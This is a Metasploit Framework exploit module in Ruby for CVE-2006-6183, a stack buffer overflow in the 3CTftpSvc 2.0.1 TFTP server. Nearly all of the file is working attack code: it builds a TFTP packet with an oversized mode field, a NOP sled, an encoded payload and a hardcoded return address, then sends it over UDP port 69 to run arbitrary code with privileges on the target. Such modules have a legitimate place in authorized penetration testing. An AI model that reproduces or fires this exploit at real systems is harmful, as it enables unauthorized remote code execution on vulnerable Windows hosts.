##
# $Id: threectftpsvc_long_mode.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'3CTftpSvc TFTP Long Mode Buffer Overflow\',
			\'Description\'    => %q{
					This module exploits a stack buffer overflow in 3CTftpSvc 2.0.1. By
				sending a specially crafted packet with an overly long mode
				field, a remote attacker could overflow a buffer and execute
				arbitrary code on the system.
			},
			\'Author\'         => \'MC\',
			\'Version\'        => \'$Revision: 9262 $\',
			\'References\'     =>
				[
					[\'CVE\', \'2006-6183\'],
					[\'OSVDB\', \'30758\'],
					[\'BID\', \'21301\'],
					[\'URL\', \'http://secunia.com/advisories/23113/\'],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'thread\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 400,
					\'BadChars\' => \"\\x00\",
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'3CTftpSvc 2.0.1\',			{ \'Ret\' => 0x00402b02 } ],
				],
			\'Privileged\'     => true,
			\'DefaultTarget\'  => 0,
			\'DisclosureDate\' => \'Nov 27 2006\'))

		register_options([Opt::RPORT(69)], self.class)
	end

	def exploit
		connect_udp

		sploit = \"\\x00\\x02\" + rand_text_alpha_upper(1) + \"\\x00\" + make_nops(73)
		sploit << payload.encoded + [target.ret].pack(\'V\') + make_nops(25) + \"\\x00\"

		print_status(\"Trying target #{target.name}...\")

		udp_sock.put(sploit)

		disconnect_udp
	end

end
